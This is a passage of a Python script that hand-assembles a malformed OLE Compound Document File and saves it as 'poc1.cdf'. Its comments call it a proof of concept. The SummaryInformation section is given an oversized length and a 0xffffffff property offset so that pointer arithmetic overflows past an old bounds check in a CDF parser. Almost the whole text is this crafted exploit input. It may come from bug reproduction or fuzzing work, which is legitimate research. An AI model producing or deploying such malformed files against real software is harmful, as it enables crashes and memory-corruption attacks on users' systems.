nsec=4

struct.pack_into('<H',buf,24,0x003e) # revision
struct.pack_into('<H',buf,26,0x0003) # version
struct.pack_into('<H',buf,28,0xfffe) # byte order
struct.pack_into('<H',buf,30,9) # sector size 512
struct.pack_into('<H',buf,32,6) # short sector 64
struct.pack_into('<I',buf,44,1) # num sat sectors
struct.pack_into('<i',buf,48,1) # first directory sector id 1
struct.pack_into('<I',buf,56,4096) # min std stream
struct.pack_into('<i',buf,60,-2) # first ssat end
struct.pack_into('<I',buf,64,0)
struct.pack_into('<i',buf,68,-2)
struct.pack_into('<I',buf,72,0)
# master SAT first entry sector 0, rest free
struct.pack_into('<i',buf,76,0)
for off in range(80,512,4): struct.pack_into('<i',buf,off,-1)
# sector 0 SAT at file offset 512: entries for sectors 0..3
sat=512
for i,v in enumerate([-3,-2,-2,-2]+[-1]*124): struct.pack_into('<i',buf,sat+4*i,v)
# sector 1 directory at offset 1024, four entries
def name_utf16le(s):
    arr=s.encode('utf-16le')+b'\x00\x00'
    return arr.ljust(64,b'\x00'), len(arr)
def dirent(idx,name,typ,first,size):
    o=1024+128*idx
    nb,nl=name_utf16le(name)
    buf[o:o+64]=nb[:64]
    struct.pack_into('<H',buf,o+64,nl)
    buf[o+66]=typ
    buf[o+67]=1
    struct.pack_into('<i',buf,o+68,-1)
    struct.pack_into('<i',buf,o+72,-1)
    struct.pack_into('<i',buf,o+76,-1)
    # uuid/flags/times zero
    struct.pack_into('<i',buf,o+116,first)
    struct.pack_into('<I',buf,o+120,size)
    struct.pack_into('<I',buf,o+124,0)

dirent(1,'\x05SummaryInformation',2,2,512)
dirent(2,'',0,-2,0)
dirent(3,'',0,-2,0)
# sector 2 summary at offset 1536
o=1536
struct.pack_into('<H',buf,o,0xfffe) # byte order
struct.pack_into('<H',buf,o+2,0)
struct.pack_into('<H',buf,o+4,0) # os version
struct.pack_into('<H',buf,o+6,2) # os windows
# class zeros at +8..23
struct.pack_into('<I',buf,o+24,1) # si_count
# section declaration at 0x1c, class zeros and sd_offset 0x30
struct.pack_into('<I',buf,o+0x1c+16,0x30)
# section header at o+0x30
p=o+0x30
struct.pack_into('<I',buf,p,0x40000000) # huge sh_len (1GB) passes old stream check via ptr overflow?
struct.pack_into('<I',buf,p+4,1) # properties
struct.pack_into('<I',buf,p+8,4) # property id PIDSI_AUTHOR maybe
struct.pack_into('<I',buf,p+12,0xffffffff) # property offset -> q before p due overflow old
open('/workspace/poc1.cdf','wb').write(buf)
print(len(buf))
